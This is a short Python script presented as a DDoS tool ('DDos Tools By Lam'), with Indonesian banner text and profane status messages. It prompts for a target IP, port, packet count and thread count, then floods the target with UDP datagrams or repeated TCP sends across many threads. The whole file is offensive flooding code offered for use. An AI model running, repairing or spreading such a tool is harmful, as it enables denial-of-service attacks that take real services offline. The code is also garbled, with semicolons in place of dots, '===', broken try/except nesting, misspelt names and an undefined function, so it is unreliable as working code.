import random
import socket 
import threading 
import os 

os.system("clear")
print("DDos Tools By Lam")
print("Semoga Tembus")
ip = str(input("ip:"))
port = int(input("port: "))
choice = str(input(" Gas Ga? (y/n): "))
times = int(input(" packects: "))
threads = int(input(" threads: "))
def run():
  data = random_unrandom(1024)
  i= random;choice(("[*]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket;SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(time):
        s.sendto(data,addr)
        print(i+"|Mamam Nih Anjing!!!")
        except:
          print("[!]|Mamam Nih Kontol!!! |")
          
          def run2():
            data = random._unrandom(16)
            i = random.choice(("[*]","[!]","[#]"))
            while True:
              try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(time):
                  s.send(data)
                  print(i +" Yo Disini!")
                  except:
                    s.close()
                    print("[*]Down")
                    
                    for y in range (threads):
                      if choice === 'y':
                        th = threading.Thread(targer = run)
                        th.start()
                        else:
                          th= threading.Thread(target = run2)
                          th.start()
